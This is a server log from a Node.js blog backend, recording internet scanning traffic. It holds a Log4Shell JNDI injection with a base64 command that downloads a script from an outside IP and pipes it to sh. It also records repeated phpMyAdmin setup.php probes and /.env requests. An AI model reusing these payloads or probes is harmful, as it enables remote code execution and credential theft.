[33m[nodemon] 2.0.21[39m
[33m[nodemon] to restart at any time, enter `rs`[39m
[33m[nodemon] watching path(s): *.*[39m
[33m[nodemon] watching extensions: js,mjs,json[39m
[32m[nodemon] starting `node node dist/index.js`[39m
(node:20087) NOTE: We are formalizing our plans to enter AWS SDK for JavaScript (v2) into maintenance mode in 2023.

Please migrate your code to use AWS SDK for JavaScript (v3).
For more information, check the migration guide at https://a.co/7PzMCcy
(Use `node --trace-warnings ...` to show where the warning was created)
[Error: ENOENT: no such file or directory, open '/home/backend-blog/dist/app-banner/banner.txt'] {
::ffff:45.95.147.236 - - [31/Dec/2023:06:02:01 +0000] "GET / HTTP/1.1" 404 139 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//45.95.147.236:2411/TomcatBypass/Command/Base64/bWtkaXIgLXAgL3RtcC8kKHdob2FtaSk7IGNkIC90bXAvJCh3aG9hbWkpOyB3Z2V0IGh0dHA6Ly80NS45NS4xNDcuMjM2L2R3LnNoIC1PLSB8IHNoOyBjdXJsIGh0dHA6Ly80NS45NS4xNDguMjM2L2R3LnNoIHwgc2g7}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//45.95.147.236:2411/TomcatBypass/Command/Base64/bWtkaXIgLXAgL3RtcC8kKHdob2FtaSk7IGNkIC90bXAvJCh3aG9hbWkpOyB3Z2V0IGh0dHA6Ly80NS45NS4xNDcuMjM2L2R3LnNoIC1PLSB8IHNoOyBjdXJsIGh0dHA6Ly80NS45NS4xNDguMjM2L2R3LnNoIHwgc2g7}')"
::ffff:205.210.31.55 - - [31/Dec/2023:06:19:20 +0000] "GET / HTTP/1.1" 404 139 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:141.255.165.66 - - [31/Dec/2023:10:21:14 +0000] "GET / HTTP/1.1" 404 139 "-" "Go-http-client/1.1"
::ffff:65.49.1.16 - - [31/Dec/2023:20:42:56 +0000] "GET / HTTP/1.1" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0 (Edition Yx GX)"
::ffff:65.49.1.19 - - [31/Dec/2023:20:43:16 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0 (Edition Yx 05)"
::ffff:65.49.1.15 - - [31/Dec/2023:20:43:20 +0000] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:06 +0000] "GET http://103.14.226.86:8000/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:07 +0000] "GET http://103.14.226.86:8000/phpmyadmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:07 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:07 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.11.3/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:08 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.0" 404 176 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:08 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:09 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.8.0.2/scripts/setup.php HTTP/1.0" 404 175 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:09 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:09 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0" 404 176 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:10 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.11.0/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:10 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.11.7/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:11 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.0" 404 176 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:11 +0000] "GET http://103.14.226.86:8000/pma/scripts/setup.php HTTP/1.0" 404 160 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:11 +0000] "GET http://103.14.226.86:8000/phpMyAdmin3/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:12 +0000] "GET http://103.14.226.86:8000/myadmin/scripts/setup.php HTTP/1.0" 404 164 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:12 +0000] "GET http://103.14.226.86:8000/MyAdmin/scripts/setup.php HTTP/1.0" 404 164 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:13 +0000] "GET http://103.14.226.86:8000/PHPMYADMIN/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:13 +0000] "GET http://103.14.226.86:8000/mysqladmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:13 +0000] "GET http://103.14.226.86:8000/SQL/scripts/setup.php HTTP/1.0" 404 160 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:14 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.5.5-pl1/scripts/setup.php HTTP/1.0" 404 177 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:14 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.5.5/scripts/setup.php HTTP/1.0" 404 173 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:15 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.5.4/scripts/setup.php HTTP/1.0" 404 173 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:15 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.5.7-pl1/scripts/setup.php HTTP/1.0" 404 177 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:15 +0000] "GET http://103.14.226.86:8000/admin/pma/scripts/setup.php HTTP/1.0" 404 166 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:16 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2/scripts/setup.php HTTP/1.0" 404 169 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:29 +0000] "GET http://103.14.226.86:8000/admin/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:30 +0000] "GET http://103.14.226.86:8000/dbadmin/scripts/setup.php HTTP/1.0" 404 164 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:30 +0000] "GET http://103.14.226.86:8000/mysql/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:31 +0000] "GET http://103.14.226.86:8000/phpMyAdmin2/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:31 +0000] "GET http://103.14.226.86:8000/phpma/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:31 +0000] "GET http://103.14.226.86:8000/sqlweb/scripts/setup.php HTTP/1.0" 404 163 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:32 +0000] "GET http://103.14.226.86:8000/webdb/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:32 +0000] "GET http://103.14.226.86:8000/websql/scripts/setup.php HTTP/1.0" 404 163 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:33 +0000] "GET http://103.14.226.86:8000/_phpMyAdmin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:33 +0000] "GET http://103.14.226.86:8000/php/scripts/setup.php HTTP/1.0" 404 160 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:33 +0000] "GET http://103.14.226.86:8000/admin/phpmyadmin/scripts/setup.txt HTTP/1.0" 404 173 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:34 +0000] "GET http://103.14.226.86:8000/db/scripts/setup.php HTTP/1.0" 404 159 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:34 +0000] "GET http://103.14.226.86:8000/sqlmanager/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:35 +0000] "GET http://103.14.226.86:8000/mysqlmanager/scripts/setup.php HTTP/1.0" 404 169 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:35 +0000] "GET http://103.14.226.86:8000/phpmanager/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:35 +0000] "GET http://103.14.226.86:8000/php-myadmin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:185.206.69.13 - - [31/Dec/2023:22:28:36 +0000] "GET http://103.14.226.86:8000/phpmy-admin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:167.248.133.33 - - [31/Dec/2023:23:24:38 +0000] "GET / HTTP/1.1" 404 139 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:87.236.176.108 - - [01/Jan/2024:02:46:41 +0000] "GET / HTTP/1.1" 404 139 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
::ffff:185.233.19.169 - - [01/Jan/2024:03:07:25 +0000] "GET / HTTP/1.1" 404 139 "-" "-"
::ffff:205.210.31.108 - - [01/Jan/2024:04:08:23 +0000] "GET / HTTP/1.1" 404 139 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:134.209.102.238 - - [01/Jan/2024:05:14:26 +0000] "GET / HTTP/1.1" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:152.32.247.56 - - [01/Jan/2024:08:00:12 +0000] "GET / HTTP/1.1" 404 139 "-" "curl/7.29.0"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:05 +0000] "GET http://103.14.226.86:8000/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:06 +0000] "GET http://103.14.226.86:8000/phpmyadmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:15 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.11.3/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:16 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.0" 404 176 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:16 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:17 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.8.0.2/scripts/setup.php HTTP/1.0" 404 175 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:17 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:18 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0" 404 176 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:19 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.11.0/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:20 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.11.7/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:21 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.0" 404 176 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:24 +0000] "GET http://103.14.226.86:8000/pma/scripts/setup.php HTTP/1.0" 404 160 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:26 +0000] "GET http://103.14.226.86:8000/phpMyAdmin3/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:28 +0000] "GET http://103.14.226.86:8000/myadmin/scripts/setup.php HTTP/1.0" 404 164 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:31 +0000] "GET http://103.14.226.86:8000/MyAdmin/scripts/setup.php HTTP/1.0" 404 164 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:33 +0000] "GET http://103.14.226.86:8000/PHPMYADMIN/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:35 +0000] "GET http://103.14.226.86:8000/mysqladmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:37 +0000] "GET http://103.14.226.86:8000/SQL/scripts/setup.php HTTP/1.0" 404 160 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:38 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.5.5-pl1/scripts/setup.php HTTP/1.0" 404 177 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:39 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.5.5/scripts/setup.php HTTP/1.0" 404 173 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:41 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.5.4/scripts/setup.php HTTP/1.0" 404 173 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:41 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.5.7-pl1/scripts/setup.php HTTP/1.0" 404 177 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:42 +0000] "GET http://103.14.226.86:8000/admin/pma/scripts/setup.php HTTP/1.0" 404 166 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:43 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2/scripts/setup.php HTTP/1.0" 404 169 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:44 +0000] "GET http://103.14.226.86:8000/web/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 171 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:44 +0000] "GET http://103.14.226.86:8000/webadmin/scripts/setup.php HTTP/1.0" 404 165 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:45 +0000] "GET http://103.14.226.86:8000/admin/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:47 +0000] "GET http://103.14.226.86:8000/dbadmin/scripts/setup.php HTTP/1.0" 404 164 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:48 +0000] "GET http://103.14.226.86:8000/mysql/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:49 +0000] "GET http://103.14.226.86:8000/phpMyAdmin2/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:54 +0000] "GET http://103.14.226.86:8000/phpma/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:27:57 +0000] "GET http://103.14.226.86:8000/sqlweb/scripts/setup.php HTTP/1.0" 404 163 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:28:03 +0000] "GET http://103.14.226.86:8000/websql/scripts/setup.php HTTP/1.0" 404 163 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:28:05 +0000] "GET http://103.14.226.86:8000/_phpMyAdmin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:28:05 +0000] "GET http://103.14.226.86:8000/php/scripts/setup.php HTTP/1.0" 404 160 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:28:06 +0000] "GET http://103.14.226.86:8000/admin/phpmyadmin/scripts/setup.txt HTTP/1.0" 404 173 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:28:07 +0000] "GET http://103.14.226.86:8000/db/scripts/setup.php HTTP/1.0" 404 159 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:28:08 +0000] "GET http://103.14.226.86:8000/sqlmanager/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:28:08 +0000] "GET http://103.14.226.86:8000/mysqlmanager/scripts/setup.php HTTP/1.0" 404 169 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:28:09 +0000] "GET http://103.14.226.86:8000/phpmanager/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:28:10 +0000] "GET http://103.14.226.86:8000/php-myadmin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:28:12 +0000] "GET http://103.14.226.86:8000/phpmy-admin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:34.224.98.209 - - [01/Jan/2024:11:28:13 +0000] "GET http://103.14.226.86:8000/mysql-admin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:8.218.112.217 - - [01/Jan/2024:11:58:14 +0000] "GET /.env HTTP/1.1" 404 143 "-" "curl/7.68.0"
::ffff:64.62.197.113 - - [01/Jan/2024:14:01:25 +0000] "GET / HTTP/1.1" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
::ffff:64.62.197.119 - - [01/Jan/2024:14:01:43 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"
::ffff:64.62.197.110 - - [01/Jan/2024:14:01:47 +0000] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 139 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
::ffff:165.227.208.174 - - [01/Jan/2024:21:41:50 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
::ffff:165.227.208.174 - - [01/Jan/2024:21:45:09 +0000] "GET / HTTP/1.1" 404 139 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
::ffff:165.227.208.174 - - [01/Jan/2024:21:45:09 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "http://103.14.226.86:8000/" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
::ffff:157.245.197.169 - - [02/Jan/2024:01:05:19 +0000] "GET / HTTP/1.1" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:205.210.31.243 - - [02/Jan/2024:02:24:09 +0000] "GET / HTTP/1.1" 404 139 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:8.140.52.219 - - [02/Jan/2024:02:56:52 +0000] "GET /.env HTTP/1.1" 404 143 "-" "curl/7.68.0"
::ffff:146.190.26.237 - - [02/Jan/2024:06:50:27 +0000] "GET / HTTP/1.1" 404 139 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
::ffff:103.203.57.20 - - [02/Jan/2024:08:18:18 +0000] "GET / HTTP/1.1" 404 139 "-" "Mozilla/5.0"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:36 +0000] "GET http://103.14.226.86:8000/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:36 +0000] "GET http://103.14.226.86:8000/phpmyadmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:37 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:37 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.11.3/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:37 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.0" 404 176 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:37 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:38 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.8.0.2/scripts/setup.php HTTP/1.0" 404 175 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:38 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:38 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0" 404 176 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:38 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.11.0/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:39 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.11.7/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:39 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.0" 404 176 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:40 +0000] "GET http://103.14.226.86:8000/pma/scripts/setup.php HTTP/1.0" 404 160 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:40 +0000] "GET http://103.14.226.86:8000/phpMyAdmin3/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:40 +0000] "GET http://103.14.226.86:8000/myadmin/scripts/setup.php HTTP/1.0" 404 164 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:40 +0000] "GET http://103.14.226.86:8000/MyAdmin/scripts/setup.php HTTP/1.0" 404 164 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:41 +0000] "GET http://103.14.226.86:8000/PHPMYADMIN/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:41 +0000] "GET http://103.14.226.86:8000/mysqladmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:41 +0000] "GET http://103.14.226.86:8000/SQL/scripts/setup.php HTTP/1.0" 404 160 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:41 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.5.5-pl1/scripts/setup.php HTTP/1.0" 404 177 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:42 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.5.5/scripts/setup.php HTTP/1.0" 404 173 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:42 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.5.4/scripts/setup.php HTTP/1.0" 404 173 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:42 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2.5.7-pl1/scripts/setup.php HTTP/1.0" 404 177 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:42 +0000] "GET http://103.14.226.86:8000/admin/pma/scripts/setup.php HTTP/1.0" 404 166 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:43 +0000] "GET http://103.14.226.86:8000/phpMyAdmin-2/scripts/setup.php HTTP/1.0" 404 169 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:43 +0000] "GET http://103.14.226.86:8000/web/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 171 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:43 +0000] "GET http://103.14.226.86:8000/webadmin/scripts/setup.php HTTP/1.0" 404 165 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:43 +0000] "GET http://103.14.226.86:8000/admin/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:44 +0000] "GET http://103.14.226.86:8000/dbadmin/scripts/setup.php HTTP/1.0" 404 164 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:44 +0000] "GET http://103.14.226.86:8000/mysql/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:44 +0000] "GET http://103.14.226.86:8000/phpMyAdmin2/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:20.244.134.31 - - [02/Jan/2024:08:50:45 +0000] "GET http://103.14.226.86:8000/phpma/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
